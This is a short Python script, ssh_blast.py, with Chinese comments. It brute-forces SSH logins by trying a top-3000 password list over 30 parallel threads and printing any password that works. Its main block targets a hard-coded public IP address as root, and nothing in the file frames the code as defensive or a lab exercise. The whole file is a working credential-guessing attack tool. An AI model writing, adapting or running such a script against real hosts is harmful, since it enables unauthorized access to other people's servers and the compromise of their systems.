# -*- coding = utf-8 -*-
# @TIME :  17:46
# @Author : 晓晓鲸鱼
# @File : ssh_blast.py
# @Software : PyCharm
# @脚本说明 :
# 为了可移植性，在使用了socket，避免了linux和win命令不一样的情况
import paramiko
import threading
import queue


class BlastSSH:

    def __init__(self):
        self.my_queue = queue.Queue()
        self.pool_lock = threading.BoundedSemaphore(30)

    def __ssh_connect(self, ip, user, passwd, port):
        self.pool_lock.acquire()
        try:
            ssh_connect = paramiko.SSHClient()
            ssh_connect.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            conn = ssh_connect.connect(ip, port, username=user, password=passwd, timeout=2)
            ssh_connect.close()
            print(f"密码{passwd}")
            self.my_queue.put(passwd)
        except:
            print('NO')
            ssh_connect.close()
        self.pool_lock.release()

    def start(self, ip, user, passwd_dict="../dict/passwd_top3000", port=22):

        with open("../dict/passwd_top3000", "r", encoding="utf8") as f:
            passwds = f.readlines()

        for passwd in passwds:
            if self.my_queue.qsize():
                print("12312\n\n\n\n\n123wwww")
                break
            passwd = passwd.strip()
            t = threading.Thread(target=self.__ssh_connect, args=(ip, user, passwd, port))
            t.start()
            # self.__ssh_connect(ip, user, passwd, port)
            if self.my_queue.qsize():
                print("12312\n\n\n\n\n123wwww")
                break


if __name__ == '__main__':
    a = BlastSSH()
    a.start("47.108.235.197", "root")
